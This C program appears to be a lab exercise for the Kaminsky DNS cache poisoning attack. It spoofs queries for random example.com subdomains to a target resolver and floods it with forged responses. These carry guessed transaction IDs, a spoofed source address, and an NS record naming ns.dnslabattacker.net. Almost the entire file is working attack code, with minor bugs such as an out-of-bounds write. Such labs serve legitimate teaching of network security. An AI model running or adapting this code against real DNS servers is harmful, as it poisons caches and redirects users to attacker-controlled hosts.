// ----udp.c------
// This sample program must be run by root lol! 
// 
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for 
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// 

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
     
// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader{
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

     

// UDP header's structure
struct udpheader{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int type;
    unsigned short int class;
};

// total udp header length: 8 bytes (=64 bits)
unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));

    tempH->udph_chksum=0;
    sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
    sum+=checksum((uint16_t *) tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);

    return (uint16_t)(~sum);
}

// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;

    for(sum=0; nwords>0; nwords--)
        sum += *buf++;

    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
{
    char *p = buffer;
    
    if (name == NULL){
        *p = 0xC0; p++;
        *p = offset; p++;
    }else{
	strcpy(p, name);
	p += strlen(name) + 1;
    }

    *((unsigned short *)p) = htons(0x0001); p += 2;// Record Type
    *((unsigned short *)p) = htons(0x0001); p += 2;// Class
    *((unsigned int *)p) = htons(0x00002000); p += 4;// Time to live
    *((unsigned short *)p) = htons(0x0004); p += 2;// Data length
    ((struct in_addr *)p)->s_addr = inet_addr(ip_addr); p += 4;// IP address

    return (p - buffer);
}

unsigned short set_NS_record(char *buffer, char *name, char offset, char *nsname)
{
    char *p = buffer;
    
    if (name == NULL){
        *p = 0xC0; p++;
        *p = offset; p++;
    }else{
	strcpy(p, name);
	p += strlen(name) + 1;
    }

    *((unsigned short *)p) = htons(0x0002); p += 2;// Record Type
    *((unsigned short *)p) = htons(0x0001); p += 2;// Class
    *((unsigned int *)p) = htons(0x00002000); p += 4;// Time to live
    *((unsigned short *)p) = htons(0x0017); p += 2;// Data length
    strcpy(p, nsname);
    p += strlen(nsname) + 1; // Name servers

    return (p - buffer);
}

unsigned short set_AR_record(char *buffer, char *name, char *ip_addr)
{
    char *p = buffer;
    
    strcpy(p, name);
    p += strlen(name) + 1;

    *((unsigned short *)p) = htons(0x0001); p += 2;// Record Type
    *((unsigned short *)p) = htons(0x0001); p += 2;// Class
    *((unsigned int *)p) = htons(0x00002000); p += 4;// Time to live
    *((unsigned short *)p) = htons(0x0004); p += 2;// Data length
    ((struct in_addr *)p)->s_addr = inet_addr(ip_addr); p += 4;// IP address

    return (p - buffer);
}

int main(int argc, char *argv[])
{
    // This is to check the argc number
    if(argc != 3){
    	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
    	exit(-1);
    }

    /***********************************************************************
    * DNS REQUEST CONSTRUCTION                                             *
    ************************************************************************/

    int sd_req; // socket descriptor
    char buf_req[PCKT_LEN]; // buffer to hold the packet
    memset(buf_req, 0, PCKT_LEN); // set the buffer to 0 for all bytes
    // Our own headers' structures
    struct ipheader *ip_req = (struct ipheader *) buf_req;
    struct udpheader *udp_req = (struct udpheader *) (buf_req + sizeof(struct ipheader));
    struct dnsheader *dns_req = (struct dnsheader *) (buf_req +sizeof(struct ipheader)+sizeof(struct udpheader));
    // data is the pointer points to the first byte of the dns payload  
    char *data_req=(buf_req +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    ////////////////////////////////////////////////////////////////////////

    dns_req->flags=htons(FLAG_Q); // The flag you need to set
    dns_req->QDCOUNT=htons(1); // only 1 query, so the count should be one.

    // query string
    strcpy(data_req,"\5aaaaa\7example\3com");
    int len_req= strlen(data_req)+1;
    // this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end_req=(struct dataEnd *)(data_req+len_req);
    end_req->type=htons(1);
    end_req->class=htons(1);

    /////////////////////////////////////////////////////////////////////
    // DNS format, relate to the lab, you need to change them, end
    /////////////////////////////////////////////////////////////////////

    // Source and destination addresses: IP and port
    struct sockaddr_in sin_req;
    int one_req = 1;
    const int *val_req = &one_req;
    dns_req->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd_req = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd_req<0 ) // if socket fails to be created 
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    sin_req.sin_family = AF_INET; // The address family
    sin_req.sin_port = htons(53); // Port numbers
    sin_req.sin_addr.s_addr = inet_addr(argv[1]); // IP addresses, this is the first argument we input into the program

    // Fabricate the IP header or we can use the standard header structures but assign our own values.
    ip_req->iph_ihl = 5;
    ip_req->iph_ver = 4;
    ip_req->iph_tos = 0; // Low delay
    unsigned short int packetLength_req =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+len_req+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip_req->iph_len=htons(packetLength_req);
    ip_req->iph_ident = htons(rand()); // we give a random number for the identification#
    ip_req->iph_ttl = 110; // hops
    ip_req->iph_protocol = 17; // UDP
    ip_req->iph_sourceip = inet_addr(argv[2]); // Source IP address
    ip_req->iph_destip = inet_addr(argv[1]); // The destination IP address

    // Fabricate the UDP header. Source port number, redundant
    udp_req->udph_srcport = htons(40000+rand()%10000);  // source port number
    udp_req->udph_destport = htons(53); // Destination port number
    udp_req->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+len_req+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//
    ip_req->iph_chksum = csum((unsigned short *)buf_req, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp_req->udph_chksum=check_udp_sum(buf_req, packetLength_req-sizeof(struct ipheader));

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd_req, IPPROTO_IP, IP_HDRINCL, val_req, sizeof(one_req))<0 )
    {
	printf("error\n");	
	exit(-1);
    }

    /***********************************************************************
    * DNS RESPONSE CONSTRUCTION                                            *
    ************************************************************************/

    int sd_rep; // socket descriptor
    char buf_rep[PCKT_LEN]; // buffer to hold the packet
    memset(buf_rep, 0, PCKT_LEN); // set the buffer to 0 for all bytes
    // Our own headers' structures
    struct ipheader *ip_rep = (struct ipheader *) buf_rep;
    struct udpheader *udp_rep = (struct udpheader *) (buf_rep + sizeof(struct ipheader));
    struct dnsheader *dns_rep = (struct dnsheader*) (buf_rep +sizeof(struct ipheader)+sizeof(struct udpheader));
    // data is the pointer points to the first byte of the dns payload  
    char *data_rep=(buf_rep +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    ////////////////////////////////////////////////////////////////////////

    dns_rep->flags=htons(FLAG_R); // The flag you need to set
    dns_rep->QDCOUNT=htons(1); // only 1 query, so the count should be one.
    dns_rep->ANCOUNT=htons(1); // answer field
    dns_rep->NSCOUNT=htons(1); // name server(authority) field
    dns_rep->ARCOUNT=htons(0); // additional fields

    // query string
    strcpy(data_rep,"\5aaaaa\7example\3com");
    int len_rep = strlen(data_rep)+1;
    // this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end_rep=(struct dataEnd *)(data_rep+len_rep);
    end_rep->type=htons(1);
    end_rep->class=htons(1);

    // paypload of dns
    char nsname[23];
    sprintf(nsname, "%c%s%c%s%c%s", 0x02, "ns", 0x0e, "dnslabattacker", 0x03, "net");
    nsname[23] = '\0'; // printf("nsname: %s\n", nsname);
    char *pld_rep = data_rep + len_rep + sizeof(end_rep);
    char *pld_start_rep = pld_rep;
    pld_rep += set_A_record(pld_rep, NULL, 0x0C, "1.1.1.1");
    pld_rep += set_NS_record(pld_rep, NULL, 0x12, nsname);
    //pld_rep += set_AR_record(pld_rep, nsname, "10.0.2.10");

    int paylen_rep = pld_rep - pld_start_rep;
    
    /////////////////////////////////////////////////////////////////////
    // DNS format, relate to the lab, you need to change them, end
    /////////////////////////////////////////////////////////////////////

    // Source and destination addresses: IP and port
    struct sockaddr_in sin_rep;
    int one_rep = 1;
    const int *val_rep = &one_rep;
    dns_rep->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd_rep = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd_rep<0 ) // if socket fails to be created 
        printf("socket sd_rep error\n");

    // The source is redundant, may be used later if needed
    sin_rep.sin_family = AF_INET; // The address family
    sin_rep.sin_port = htons(33333); // Port numbers
    sin_rep.sin_addr.s_addr = inet_addr(argv[1]); // IP addresses, this is the second argument we input into the program

    // Fabricate the IP header or we can use the standard header structures but assign our own values.
    ip_rep->iph_ihl = 5;
    ip_rep->iph_ver = 4;
    ip_rep->iph_tos = 0; // Low delay
    unsigned short int packetLength_rep =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+len_rep+sizeof(struct dataEnd)+paylen_rep); // length + dataEnd_size == UDP_payload_size
    ip_rep->iph_len=htons(packetLength_rep);
    ip_rep->iph_ident = htons(rand()); // we give a random number for the identification#
    ip_rep->iph_ttl = 110; // hops
    ip_rep->iph_protocol = 17; // UDP
    ip_rep->iph_sourceip = inet_addr("199.43.135.53"); // Source IP address
    ip_rep->iph_destip = inet_addr(argv[1]); // The destination IP address

    // Fabricate the UDP header. Source port number, redundant
    udp_rep->udph_srcport = htons(53);  // source port number
    udp_rep->udph_destport = htons(33333); // Destination port number
    udp_rep->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+len_rep+sizeof(struct dataEnd)+paylen_rep); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//
    ip_rep->iph_chksum = csum((unsigned short *)buf_rep, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp_rep->udph_chksum=check_udp_sum(buf_rep, packetLength_rep-sizeof(struct ipheader));

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd_rep, IPPROTO_IP, IP_HDRINCL, val_rep, sizeof(one_rep))<0 )
    {
	printf("error\n");	
	exit(-1);
    }

    // loop: first spood DNS resquest for name like "*****.example.com", then spoof 
    //       a large number of DNS responses which tell local DNS Server that the name
    //       server is "ns.dnslabattacker.com". Every recurrence, change the one byte
    //       of the first five bytes of the original name. Then, attack again.
    while (1)
    {
	int num = 1 + random()%5;
	*(data_req+num) += 1;
	udp_req->udph_chksum=check_udp_sum(buf_req, packetLength_req-sizeof(struct ipheader));

	if(sendto(sd_req, buf_req, packetLength_req, 0, (struct sockaddr *)&sin_req, sizeof(sin_req)) < 0)
	    printf("packet send error %d which means %s\n",errno,strerror(errno));
	else
	{
	    int i;
	    *(data_rep+num) += 1;
	    for (i = 0; i < 5000; i++)
	    {
		dns_rep->query_id = rand();
		udp_rep->udph_chksum=check_udp_sum(buf_rep, packetLength_rep-sizeof(struct ipheader));
	 	if(sendto(sd_rep, buf_rep, packetLength_rep, 0, (struct sockaddr *)&sin_rep, sizeof(sin_rep)) < 0)
		    printf("packet send error %d which means %s\n",errno,strerror(errno));
	    }
	}

    }

    close(sd_rep);
    close(sd_req);
    return 0;

}
